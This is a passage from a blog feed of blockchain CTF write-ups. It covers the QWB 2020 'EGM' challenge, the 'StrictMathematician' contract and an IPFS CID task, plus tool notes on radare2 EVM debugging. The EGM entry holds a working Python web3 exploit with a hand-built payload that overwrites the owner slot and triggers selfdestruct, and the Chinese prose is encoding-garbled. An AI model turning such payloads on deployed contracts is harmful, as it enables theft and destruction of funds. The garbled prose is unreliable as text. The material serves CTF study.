w3.eth.getTransactionCount(Web3.toChecksumAddress(public)), &apos;value&apos;: Web3.toWei(1, &apos;ether&apos;), &apos;data&apos;: data, &#125; signed_txn = w3.eth.account.signTransaction(txn, private) txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash) print(&quot;txn_hash=&quot;, txn_hash) return txn_receiptprint(do_callme(public)) å®Œç¾Žï¼Œå·æ‡’ä¸æ„§æ˜¯æˆ‘ï¼Œè¿™é‡Œå°±ä¸å…·ä½“åˆ†æžé¢˜ç›®äº†ï¼Œæœ‰å…´è¶£çš„è‡ªè¡Œåˆ†æž]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>Smart Contract</tag>
        <tag>SecurityInnovatio</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctfåŒºå—é“¾å‡ºé¢˜æ¨¡æ¿ dockeréƒ¨ç½²]]></title>
    <url>%2F2020%2Fblockchain-template%2F</url>
    <content type="text"><![CDATA[ctf åŒºå—é“¾å‡ºé¢˜æ¨¡æ¿ docker ä¸€é”®éƒ¨ç½² ä¸ªäººå–œæ¬¢çš„å‡ºé¢˜æ–¹å¼ éƒ¨ç½²åˆçº¦çš„å¤–éƒ¨è´¦æˆ·éšæœºç”Ÿæˆï¼Œæ¯ä¸ªé€‰æ‰‹éƒ½ä¸ä¸€æ ·ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯é˜²æ­¢â€œæŠ„ä½œä¸šâ€ ç‚¹æˆ‘åŽ»æŸ¥çœ‹]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è°ƒè¯•evmå­—èŠ‚ç -radare2]]></title>
    <url>%2F2020%2Fradare2%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ä¸ç»æ„å‘çŽ°çš„ radare2 ä¹Ÿå¯ä»¥è°ƒè¯• EVM bytecode å¯è°ƒè¯•äº¤æ˜“å®žæ—¶æŸ¥çœ‹ stack å’Œ memory ä¿¡æ¯ ä¸æ–­æŽ¢ç´¢å¥½ç”¨å¥½çŽ©çš„åŠŸèƒ½ï¼Œä¸æ–­æ›´æ–° å…·ä½“çš„æŒ‡ä»¤åŠå…¶æ“ä½œå°±é è‡ªå·±å’¯ ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿žæŽ¥åˆ°äº¤æ˜“è°ƒè¯• 1r2 -a evm -D evm &quot;evm://localhost:8545@0x837f83456921c1f38605d87ed7850c0aa668ecce55efbedf9da21d712dd040fe&quot; stack æ ˆé¡¶åœ¨ 0x00008fff ä½ç½® memory ä½ç½®ä»Ž 0x10000 å¼€å§‹ï¼Œæ‰€ä»¥éœ€è¦æ‰‹å·¥è°ƒæ•´åˆ° 0x10000 ï¼Œå¯ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ 1px 512 @ 0x10000]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>evm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qwb2020 ç¬¬å››å±Šå¼ºç½‘æ¯çº¿ä¸‹èµ›åŒºå—é“¾ EGM]]></title>
    <url>%2F2020%2Fegm%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ç¬¬å››å±Š qwb çº¿ä¸‹èµ› EGM èµ›é¢˜ WP è€ƒç‚¹æ˜¯ Return Oriented Programming å€Ÿç”¨å·¥å…· ida-evm åæ±‡ç¼–è¾…åŠ©åˆ†æž ä¹Ÿå¯å€ŸåŠ©åœ¨çº¿å·¥å…· https://www.trustlook.com/services/smart.html åç¼–è¯‘è¾…åŠ©åˆ†æž Source16210000060405260043610610073576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680638d715d9d1461024557806360fe47b11461031a5780636d4ce63c1461035557806335f4699414610372578063b4a99a4e1461038157610073565b610078565b600080fd600060006000600060005b61012061010052565b6101005190565b60206101005101806101005252565b6101005151602061010051036101005290565b61010052565b6100ca610100516100975b565b565b6100d66100a6565b6100de6100a6565b6100e7906100b9565b565b6100f1610087565b565b34156100cc57610078565b6101086000610097565b5b7f01000000000000000000000000000000000000000000000000000000000000006101005151602061010051035101510415610152575b60016101005151016101005152610109565b61015a6100a6565b6101626100a6565b506100ce565b6101726000610097565b5b6020610100510351610100515103156101d9577f0100000000000000000000000000000000000000000000000000000000000000610100515160606101005103510151046101005151604061010051035101535b60016101005151016101005152610173565b60006101005151604061010051035101535b60406101005151061561021c5760006101005151604061010051035101535b600161010051510161010051526101eb565b6102246100a6565b5061022d6100a6565b506102366100a6565b5061023f6100a6565b506100ce565b61024d6100e9565b6102576000610097565b610100516102656212345650565b36602462013000376102756100bf565b61028061034f610097565b61028c62013000610097565b61029581610097565b6102a160243603610097565b610168565b6102ae6100bf565b6102b96102c7610097565b6102c281610097565b6100fe565b6020610100510381602060408303526020820352602060208203510660208203510360200160400160408203f35b602061010051035161010051515561030b6100a6565b506103146100a6565b506100ce565b6103226100f3565b61032a6100bf565b61033561034f610097565b610340600435610097565b61034a6000610097565b6102f5565b60006000f35b61035d6100f3565b60005433146100785760005460805260206080f35b60665433141561007857606654ff5b6066543314156100785733606655005b505050505050505050505050505050505050505050505050505050505050505050505050505050 Analyse ä½¿ç”¨ https://www.trustlook.com/services/smart.html åˆ†æžçš„ç»“æžœå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218contract disassembler &#123; function Backdoor() public return () &#123; var1 = func_00000087(); return(); &#125; function set() public return () &#123; // Please refer to main() for the functionality, Function Hash: 60FE47B1 &#125; function get() public return () &#123; require(!msg.value); return(); &#125; function die() public return () &#123; // Please refer to main() for the functionality, Function Hash: 35F46994 &#125; function Owner() public return () &#123; // Please refer to main() for the functionality, Function Hash: B4A99A4E &#125; function func_00000087() private return (var0) &#123; mstore(0x100,0x120); return(var1); &#125; function func_00000097( uint256 arg0) private return (var0) &#123; temp0 = mload(0x100); mstore(0x100,(temp0 + 0x20)); mstore((temp0 + 0x20),arg0); return(var0); &#125; function func_000000BF() private return (var0) &#123; var4 = mload(0x100); var2 = func_00000097(var4); return(var1); &#125; function func_000000A6() private return (var0) &#123; temp12 = mload(0x100); temp14 = mload(temp12); temp13 = mload(0x100); mstore(0x100,(temp13 - 0x20)); return(temp14); &#125; function func_000000B9( uint256 arg0) private return (var0) &#123; mstore(0x100,arg0); return(var2); &#125; function main() public return () &#123; mstore(0x40,0x100000); if ((msg.data.length &lt; 0x4)) &#123;label_00000073:label_00000078: revert(0x0,0x0); &#125; //ISSUE:COMMENT: Function Backdoor() else if ((0x8D715D9D == uint32((msg.data(0x0) / 0x100000000000000000000000000000000000000000000000000000000)))) &#123; Backdoor(); var0 = func_00000097(0x0); calldatacopy(0x13000,0x24,msg.data.length); var1 = func_000000BF(); var1 = func_00000097(0x34F); var1 = func_00000097(0x13000); var1 = func_00000097(var1); var1 = func_00000097((msg.data.length - 0x24)); var1 = func_00000097(0x0);label_00000173: temp2 = mload(0x100); temp5 = mload((temp2 - 0x20)); temp3 = mload(0x100); temp4 = mload(temp3); if ((temp4 - temp5)) &#123; temp22 = mload(0x100); temp25 = mload(temp22); temp23 = mload(0x100); temp24 = mload((temp23 - 0x60)); temp26 = mload((temp24 + temp25)); temp27 = mload(0x100); temp30 = mload(temp27); temp28 = mload(0x100); temp29 = mload((temp28 - 0x40)); mstore8((temp29 + temp30),(temp26 / 0x100000000000000000000000000000000000000000000000000000000000000)); temp31 = mload(0x100); temp32 = mload(temp31); temp33 = mload(0x100); mstore(temp33,(temp32 + 0x1)); goto label_00000173; &#125; else &#123; temp6 = mload(0x100); temp9 = mload(temp6); temp7 = mload(0x100); temp8 = mload((temp7 - 0x40)); mstore8((temp8 + temp9),0x0);label_000001EB: temp10 = mload(0x100); temp11 = mload(temp10); if (MOD(temp11,0x40)) &#123; temp15 = mload(0x100); temp18 = mload(temp15); temp16 = mload(0x100); temp17 = mload((temp16 - 0x40)); mstore8((temp17 + temp18),0x0); temp19 = mload(0x100); temp20 = mload(temp19); temp21 = mload(0x100); mstore(temp21,(temp20 + 0x1)); goto label_000001EB; &#125; else &#123; var2 = func_000000A6(); var2 = func_000000A6(); var2 = func_000000A6(); var2 = func_000000A6(); var2 = func_000000A6(); var3 = func_000000A6(); var3 = 0xE7; var2 = func_000000B9(var3); &#125; &#125; &#125; //ISSUE:COMMENT: Function set() else if ((0x60FE47B1 == var0)) &#123; get(); var0 = func_000000BF(); var0 = func_00000097(0x34F); var0 = func_00000097(msg.data(0x4)); var0 = func_00000097(0x0); temp34 = mload(0x100); temp37 = mload((temp34 - 0x20)); temp35 = mload(0x100); temp36 = mload(temp35); sstore(temp36,temp37); var1 = func_000000A6(); var1 = func_000000A6(); var1 = func_000000A6(); var2 = func_000000A6(); var2 = 0xE7; var1 = func_000000B9(var2); &#125; //ISSUE:COMMENT: Function get() else if ((0x6D4CE63C == var0)) &#123; get(); if ((msg.sender == sload(0x0))) &#123; goto label_00000078; &#125; else &#123; mstore(0x80,sload(0x0)); RETURN(0x80,0x20); &#125; &#125; //ISSUE:COMMENT: Function die() else if ((0x35F46994 == var0)) &#123; if ((msg.sender == sload(0x66))) &#123; //ISSUE:WARNING: SELFDESTRUCT is used to for the destruction selfdestruct(sload(0x66)); &#125; else &#123; goto label_00000078; &#125; &#125; //ISSUE:COMMENT: Function Owner() else if ((0xB4A99A4E == var0)) &#123; if ((msg.sender == sload(0x66))) &#123; sstore(0x66,msg.sender); stop(); &#125; else &#123; goto label_00000078; &#125; &#125; else &#123; goto label_00000073; &#125; &#125;&#125; æ ¹æ®ä¸Šé¢åç¼–è¯‘ç»“æžœåŠå…¶ ida-evm å…·ä½“åˆ†æžä¸€ä¸‹å¯ä»¥å¾—åˆ°ä¸‹é¢çš„ä¼ªä»£ç  12345678910111213141516function get() public returns (address) &#123; require(msg.value == 0); require(msg.sender != sload(0x0)); return sload(0x0);&#125;function die() public &#123; require(msg.sender == sload(0x66)); selfdestruct(sload(0x66));&#125;function Owner() public &#123; require(msg.sender == sload(0x66)); sstore(0x66,msg.sender); stop();&#125; æ ¹æ®åç¼–è¯‘ç»“æžœåŠå…¶ ida-evm å…·ä½“åˆ†æž set å‡½æ•°å’Œ Backdoor å‡½æ•°ï¼Œå¯å‘çŽ°å…¶åˆ©ç”¨ mem å®žçŽ°äº†ç±»å †æ ˆæ“ä½œï¼Œå¯æ€»ç»“å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576function stack_push(uint256 value) private &#123; memory[0x100] = memory[0x100] + 0x20; memory[memory[0x100]+0x20] = value;&#125;function stack_get(uint256 depth) private &#123; return memory[memory[0x100] - depth*0x20];&#125;function stack_pop() private returns (uint256 value) &#123; value = memory[memory[0x100]]; memory[0x100] = memory[0x100] - 0x20;&#125;function stack_push_frame() private &#123; stack_push(memory[0x100]);&#125;function stack_pop_frame() private returns (uint256 dest) &#123; dest = stack_pop(); memory[0x100] = stack_pop();&#125;function set(uint256 value) public &#123; stack_push_frame(); stack_push(0x34f); stack_push(value); stack_push(0x00); set_ss();&#125;function set_ss() private &#123; sstore(stack_get(0x0),stack_get(1)); stack_pop(); stack_pop(); goto stack_pop_frame();&#125;function Backdoor() public &#123; memory[0x100] = 0x120; stack_push(0x00); var var1 = memory[0x100]; // 0x140 memcpy(memory[0x13000], msg.data[0x24], msg.data.length); stack_push_frame(); stack_push(irrelevant_lbl); stack_push(0x13000); stack_push(var1); stack_push(msg.data.length - 0x24); stack_push(0x00); copy_data(); memory[stack_get(2) + stack_get(0)] = 0x00; pad_data(); stack_pop(); stack_pop(); stack_pop(); stack_pop(); goto stack_pop_frame();&#125;function copy_data() private &#123; while (stack_get(0) - stack_get(1) != 0) &#123; memory[stack_get(2) + stack_get(0)] = memory[stack_get(3) + stack_get(0)] &gt;&gt; 248; memory[memory[0x100]] = memory[memory[0x100]] + 0x01; &#125;&#125;function pad_data() private &#123; while (stack_get(0) % 0x40 != 0) &#123; memory[stack_get(2) + stack_get(0)] = 0x00; memory[memory[0x100]] = memory[memory[0x100]] + 0x01; &#125;&#125; å…¶ä¸­æˆ‘ä»¬è¦ä½¿ set å¯¹åº”çš„å †æ ˆå¦‚ä¸‹ 123456789--------------------------------| stack frame set() |--------------------------------| address of &apos;return&apos; gadget | |-------------------------------- | stack grows down| our address | V--------------------------------| 0x66 |-------------------------------- Backdoor å¯¹åº”çš„å †æ ˆå¦‚ä¸‹ 123456789101112131415----------------------------------| 0x00 | &lt;---- this is 0x140----------------------------------| stack frame Backdoor() |----------------------------------| address of &apos;return&apos; gadget | |---------------------------------- | stack grows down| 0x13000 | V----------------------------------| 0x140 |----------------------------------| msg.data.length - 0x24 |----------------------------------| 0x00 |---------------------------------- å½“è°ƒç”¨ Backdoor æ—¶ï¼Œå®ƒä¼šå°† msg.data[0x24:] å¤åˆ¶åˆ°å†…å­˜ [0x140] ä¸­ã€‚ è¿™æ„å‘³ç€å¦‚æžœæˆ‘ä»¬çš„æ¶ˆæ¯é•¿äºŽ 0x20 å­—èŠ‚ï¼Œå®ƒå°†ç ´åå †æ ˆï¼Œç„¶åŽè¦†ç›–è¿”å›žåœ°å€ï¼Œä»¥æ­¤ç±»æŽ¨ã€‚Backdoor ä¸­å°† payload å¤åˆ¶åˆ°å†…å­˜ [0x13000] ä¸­ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°æ›´æ–°å †æ ˆå¸§æŒ‡é’ˆï¼Œå¹¶ä½¿å…¶æŒ‡å‘æˆ‘ä»¬çš„å †æ ˆæ‰€åœ¨çš„ 0x13000 å¤„ æˆ‘ä»¬éœ€è¦å¯¹ Backdoor è¿›è¡Œè°ƒç”¨ï¼Œmsg.data[0x24:] åŽçš„æ•°æ®æ¯ 0x20 é•¿åº¦ä¸ºä¸€ä¸ªå•ä½ï¼Œå…ˆæ˜¯ä¸€ä¸ªå•ä½çš„ 0 å¡«å…… 0x140 ä½ç½®ï¼ŒæŽ¥ç€ä¸¤ä¸ªå•ä½è¦†ç›–å †æ ˆå¸§æŒ‡é’ˆå’Œè¿”å›žåœ°å€ã€‚æ€»çš„ msg.data é•¿åº¦ä¸º 0x164 å­—èŠ‚ï¼Œæ‰€ä»¥ msg.data[24:] é•¿åº¦ä¸º 0x140 å­—èŠ‚ï¼Œæ‰€ä»¥å‡å †æ ˆå¸§æŒ‡é’ˆæŒ‡å‘ 0x13120 ã€‚æ ¹æ® set_ss æ‰€åœ¨çš„ä½ç½®ï¼Œä½¿ç”¨ 0x2f5 ä½œä¸ºè¿”å›žä½ç½®ã€‚å› ä¸ºpayload æ˜¯ä¸€æ¬¡ä¸€ä¸ªå­—èŠ‚å¤åˆ¶åˆ° mem ä¸­ï¼Œæ‰€ä»¥åœ¨è¦†ç›–æŽ¥ä¸‹æ¥çš„å››ä¸ªå•ä½æ—¶éœ€è¦æ³¨æ„ï¼šå‰ä¸‰ä¸ªæ˜¯é™æ€å€¼ï¼Œç¬¬å››ä¸ªæ˜¯åŠ¨æ€å€¼ï¼ˆéœ€è¦æ³¨æ„ï¼Œæ­¤æ—¶çš„ç¬¬ä¸‰ä¸ªå•ä½è¦æŒ‰ç…§ 0x40 é•¿åº¦å¯¹é½ï¼Œæ‰€ä»¥ç¬¬ä¸‰ä¸ªå•ä½æ˜¯0x140ï¼‰ï¼Œæ­¤æ—¶ payload å¦‚ä¸‹æ‰€ç¤ºï¼š 123456789data = &apos;0x8d715d9d&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000013120&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000002f5&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000013000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000000df&apos; æœ€åŽï¼Œå¯ä»¥æž„é€  set_ssï¼Œå¹¶ä½¿ç”¨å…¶å¯¹å †æ ˆè¿›è¡Œè¯»å–æ“ä½œã€‚é¦–å…ˆæŒ‡å®š set_ss çš„è¿”å›žåœ°å€ä¸º0x34fèƒ½å¤Ÿæ­£å¸¸ç»“æŸï¼›ç„¶åŽï¼ŒæŒ‡å®šè¦å†™å…¥å­˜å‚¨çš„å€¼ï¼›æœ€åŽæŒ‡å®šè¦å†™å…¥çš„å­˜å‚¨æ§½ 0x66 123000000000000000000000000000000000000000000000000000000000000034f0000000000000000000000008F348B14089Bc472DE7bC954F3ABB7e169C000010000000000000000000000000000000000000000000000000000000000000066 æ‰€ä»¥ï¼Œæ€»çš„ payload å¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112data = &apos;0x8d715d9d&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000013120&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000002f5&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000013000&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000140&apos;data += &apos;00000000000000000000000000000000000000000000000000000000000000df&apos;data += &apos;000000000000000000000000000000000000000000000000000000000000034f&apos;data += &apos;0000000000000000000000008F348B14089Bc472DE7bC954F3ABB7e169C00001&apos;data += &apos;0000000000000000000000000000000000000000000000000000000000000066&apos; æœ€åŽè°ƒç”¨ die å³å¯ Exp1234567891011121314151617181920212223242526272829303132333435363738from web3 import Web3, HTTPProviderw3 = Web3(Web3.HTTPProvider("http://192.168.100.8:8888"))contract_address = "0xcbfa6049c0a04031ac0335afe323e3f993856e76"private = "3669a3b95e09cdb89777d777d63147bd7357fcce9219ce1f8e465b86b1135c59"public = "0x8F348B14089Bc472DE7bC954F3ABB7e169C00001"data = '0x8d715d9d'data += '0000000000000000000000000000000000000000000000000000000000000000'data += '0000000000000000000000000000000000000000000000000000000000000000'data += '0000000000000000000000000000000000000000000000000000000000013120'data += '00000000000000000000000000000000000000000000000000000000000002f5'data += '0000000000000000000000000000000000000000000000000000000000013000'data += '0000000000000000000000000000000000000000000000000000000000000140'data += '0000000000000000000000000000000000000000000000000000000000000140'data += '00000000000000000000000000000000000000000000000000000000000000df'data += '000000000000000000000000000000000000000000000000000000000000034f'data += '0000000000000000000000008F348B14089Bc472DE7bC954F3ABB7e169C00001'data += '0000000000000000000000000000000000000000000000000000000000000066'def hack(public, data): txn = &#123; 'from': Web3.toChecksumAddress(public), 'to': Web3.toChecksumAddress(contract_address), 'gasPrice': w3.eth.gasPrice, 'gas': 8000000, 'nonce': w3.eth.getTransactionCount(Web3.toChecksumAddress(public)), 'data': data, &#125; signed_txn = w3.eth.account.signTransaction(txn, private) txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex() txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash) print("txn_hash=", txn_hash) return txn_receiptprint(hack(public, data))print(hack(public, '0x35f46994'))]]></content>
      <categories>
        <category>qwb2020</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>qwb2020</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç¬¬ä¸€å±Šé’“é±¼åŸŽæ¯ strictmathematician WP]]></title>
    <url>%2F2020%2Fstrictmathematician%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ç¬¬ä¸€å±Šé’“é±¼åŸŽæ¯ï¼Œ2020çº¿ä¸Šæ™ºåšä¼š strictmathmatician çš„ WP é¢˜ç›®å¾ˆç®€å•ï¼Œè€ƒå¯Ÿçš„å…¶å®žæ˜¯storageå­˜å‚¨ï¼Œä¸»è¦æ¶‰åŠåŠ¨æ€æ•°ç»„å’Œmapç±»åž‹æ•°æ® é¢˜ç›®æ²¡ç»™çš„é‚£éƒ¨åˆ†ä»£ç å…¶å®žåªæ˜¯å¯¹map(address)å¯¹åº”çš„æ•°ç»„é•¿åº¦çš„é™åˆ¶ï¼Œå¦‚æžœé¢˜ç›®åˆ†æžçš„æ¯”è¾ƒé€å½»ï¼Œè¿™éƒ¨åˆ†æ˜¯ä¸ä¼šé€ æˆå½±å“çš„ï¼Œå› ä¸ºæ¯”èµ›åªæœ‰ä¸€å¤©ï¼ŒåŽæ¥ç›´æŽ¥ç»™äº†å®Œæ•´çš„æºç  Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108pragma solidity ^0.4.23;contract StrictMathematician &#123; address owner; string private constant welcome = &quot;Oh, fantansitic baby! I am a strict mathematician&quot;; uint randomNumber = 0; uint createtime = now; constructor() public payable&#123; owner = msg.sender; &#125; struct Target &#123; function() internal callback; uint32 value; address origin; address sender; bytes12 hash; uint time; &#125; Target[] Targets; struct FailLog &#123; uint idx; address origin; uint time; bytes12 guessnum; address sender; &#125; mapping(address =&gt; FailLog[]) FailLogs; event SendFlag(address addr); function start(bytes12 hash) public payable &#123; Target target; target.origin = tx.origin; target.sender = msg.sender; target.hash = hash; require(msg.value == 1 ether); target.value += 1; Targets.push(target); &#125; function guess(uint idx, bytes12 num) public &#123; if (bytes12(keccak256(abi.encodePacked(num))) != Targets[idx].hash) &#123; FailLog faillog; faillog.idx = idx; faillog.time = now; faillog.origin = tx.origin; faillog.sender = msg.sender; faillog.guessnum = num; FailLogs[msg.sender].push(faillog); &#125; else &#123; Target target = Targets[idx]; target.value += 1; &#125; &#125; function check(uint idx, uint tmp) public &#123; uint maxlen = check_len(address(msg.sender)) + tmp * 3 / 4 ; require(uint(read_slot(uint(cal_mapaddr(uint(msg.sender),4)))) &lt;= maxlen); require(tmp != 0); Target target = Targets[idx+tmp]; require(uint32(target.value+1)==0); target.callback(); &#125; function payforflag() public payable &#123; require(address(this).balance == 0); emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125; function read_slot(uint k) internal view returns (bytes32 res) &#123; assembly &#123; res := sload(k) &#125; &#125; function cal_mapaddr(uint k, uint p) internal pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(k, p)); &#125; function cal_arrayaddr(uint p) internal pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(p)); &#125; function check_len(address addr) internal pure returns(uint maxlen)&#123; uint res = uint(cal_arrayaddr(uint(cal_mapaddr(uint(addr),4)))); uint sum = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff; uint begin = uint(keccak256(abi.encodePacked(uint(3)))); uint distance; uint remainder; if (res&gt;begin) &#123; distance = res - begin; &#125; else&#123; distance = sum - begin + res + 1; &#125; remainder = distance % 3; if (remainder==0) &#123; maxlen = 1; &#125; else if (remainder==1) &#123; maxlen = 3; &#125; else &#123; maxlen = 2; &#125; &#125;&#125; Analyse è°ƒç”¨ start(0x000000000000000000000000) è°ƒç”¨ guess(0, 0xffffffff0000000000000153) ä¸€æ¬¡ è®¡ç®— target = kecaak256(keccak256(addr|4))+3 è®¡ç®— base = keccak256(3) distance = (2**256-base+target) % (2**256), idx = distance // 3 è‹¥ distance % 3 = 0, åˆ™ idx = idx è‹¥ distance % 3 = 1, åˆ™ idx += 4 ,è°ƒç”¨ guess(0, 0xffffffff0000000000000153) ä¸¤æ¬¡ è‹¥ distance % 3 = 2, åˆ™ idx += 2 ,æŽ‰ç”¨ guess(0, 0xffffffff0000000000000153) ä¸€æ¬¡ è°ƒç”¨ guess(0, 0xffffffff0000000000000153) ä¸‰æ¬¡ è°ƒç”¨ check(idx, 4) ï¼Œå…¶ä¸­ tmp ä¸º 4 çš„å€æ•°ï¼Œåœ¨è°ƒç”¨ check ä¹‹å‰éœ€è°ƒç”¨ guess(0, 0xffffffff0000000000000153) çš„æ¬¡æ•°ä¸º tmp*3/4]]></content>
      <categories>
        <category>é’“é±¼åŸŽæ¯</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>é’“é±¼åŸŽæ¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qwb2020 ç¬¬å››å±Šå¼ºç½‘æ¯çº¿ä¸Šèµ›åŒºå—é“¾]]></title>
    <url>%2F2020%2Fqwb2020%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ç¬¬å››å±Š qwbï¼Œblockchains çš„ WPï¼Œå‹¿å–· é¢˜ç›®è€ƒæŸ¥çš„ç‚¹å­ä¹Ÿä¸æ˜¯å¾ˆæ–°ï¼Œå‹¿å–·2333 éšæ—¶æ¬¢è¿Žå¤§å®¶æ¥äº¤æµï¼Œåˆ«å–·å°±å¥½ï¼Œè°¢è°¢ æ²¡æœ‰å®˜æ–¹ WP ï¼Œæˆ‘åªæ˜¯è‡ªå·±å†™ç€çŽ© IPFS é¢˜ç›®è€ƒæŸ¥çš„æ˜¯æœ€è¿‘å¾ˆç«çš„ IPFS ï¼Œä¸è¿‡å¾ˆç®€å•ï¼Œè€ƒæŸ¥çš„æ˜¯ IPFS å­˜å‚¨è§„åˆ™è®¡ç®—çš„ç›¸å…³çŸ¥è¯†ï¼Œä¸è¿‡é¢˜ç›®å¯èƒ½æè¿°çš„ä¸æ¸…æ¥šï¼Œå¯¼è‡´æœ‰äº›é€‰æ‰‹ä¸æ˜Žç™½ hash æ˜¯ä»€ä¹ˆæ„æ€2333ï¼Œå†åŠ ä¸Šæœ€åŽæ‰¾åˆ°ä¸¤å¼ å›¾ç‰‡ï¼Œå¯æ˜¯æäº¤çš„ flag ä¸å¯¹ï¼Œå¯¼è‡´é€‰æ‰‹ä»¥ä¸ºæ˜¯è„‘æ´žé¢˜ç›®ï¼Œè‡ªå·±åœ¨é‚£çŒœ hash åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œå…¶å®žå¹¶ä¸æ˜¯ï¼Œæ˜¯å› ä¸º pic1 è¢«æŒ‡å®šå¤§å°åˆ†å—å­˜å‚¨äº†ï¼Œæ‰€ä»¥ä½ ç›´æŽ¥æŒ‰ç…§ä¸€ä¸ªå—è®¡ç®—çš„ cid ç»“æžœä¸å¯¹ï¼Œåœ¨æ­¤è¯´å£°æŠ±æ­‰ï¼Œå…¶å®ž hash å°±æ˜¯æ–‡ä»¶çš„ cidï¼Œå‡ºé¢˜çš„æ—¶å€™æ²¡æœ‰è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ï¼Œæ‰€ä»¥é¢˜ç›®ç›®çš„ä¸æ˜¯ä¸ºäº†è„‘æ´žï¼Œåœ¨æ­¤è§£é‡Šä¸€ä¸‹ï¼Œä¸è¿‡çœ‹äº†ç»å¤§å¤šæ•°é˜Ÿä¼çš„ WP å‘çŽ°ä»–ä»¬ç†è§£çš„æ²¡æœ‰åå·®ï¼Œæˆ‘ä¹Ÿä¸æ˜Žç™½ä¸ºä»€ä¹ˆ éœ€è¦äº†è§£ä¸€ä¸‹ IPFS æ˜¯å¦‚ä½•è®¡ç®—æ–‡ä»¶ hash çš„ï¼Œå³ cidï¼Œç®€åŒ–æ€»ç»“ä¸ºï¼šåŽŸå§‹æ•°æ®æ·»åŠ å…ƒæ•°æ®å°è£…æˆ IPFS æ–‡ä»¶ -&gt; è®¡ç®— SHA2-256 -&gt; å°è£…æˆ multihash -&gt; è½¬æ¢æˆ Base58 æ‰€ä»¥å¯¹äºŽ pic2.jpg ï¼Œæˆ‘ä»¬è®¡ç®—å®ƒçš„ multihash ç„¶åŽè½¬ Base58 å³å¯ï¼Œå¯ä½¿ç”¨å¦‚ä¸‹è„šæœ¬è®¡ç®— 12import base58print base58.b58encode_int(int("1220659c2a2c3ed5e50f848135eea4d3ead3fa2607e2102ae73fafe8f82378ce1d1e", 16)) è®¡ç®—ç»“æžœä¸º QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3 ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æŽ¥è®¿é—® https://ipfs.io/ipfs/QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3 å³å¯ å¯¹äºŽ pic1.jpg ï¼Œè€ƒæŸ¥çš„æ˜¯ IPFS æ–‡ä»¶çš„ç¢Žç‰‡åŒ–å­˜å‚¨ï¼ŒIPFS é»˜è®¤è§„åˆ™æ˜¯æ–‡ä»¶æ‰€å ç©ºé—´å¤§äºŽ 256kb å°±ä¼šè¢«åˆ‡åˆ†æˆå°å—ï¼Œæ¯ä¸€å—å°äºŽæˆ–ç­‰äºŽ 256kb ã€‚ä¸è¿‡æˆ‘ä»¬ä¸Šä¼ æ—¶å¯ä»¥æŒ‡å®šç¢Žç‰‡åŒ–çš„å¤§å°ï¼Œä½¿ç”¨ -s size-? å‚æ•°å³å¯ï¼Œé¢˜ç›®æ˜¯æŠŠ pic1.jpg ç¢Žç‰‡åŒ–æˆäº† 6 ä¸ª block ï¼Œåˆ†åˆ«ç»™å‡ºäº†å®ƒä»¬çš„æ–‡ä»¶ hash å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†å…¶æ‹¼æˆä¸€å¼ 